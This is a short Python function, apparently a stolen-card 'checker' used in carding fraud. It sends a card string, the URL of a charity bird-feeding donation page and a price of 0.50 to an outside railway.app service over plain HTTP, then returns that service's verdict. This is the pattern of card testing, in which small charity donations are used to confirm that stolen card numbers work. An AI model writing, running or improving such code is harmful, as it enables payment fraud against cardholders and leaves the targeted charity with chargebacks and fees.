import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://www.feedthebirds.org.uk/donations/feed-the-birds-donation-2/"
	price="0.50"
	res=requests.get(f'http://pqy2-production-539f.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
	return res
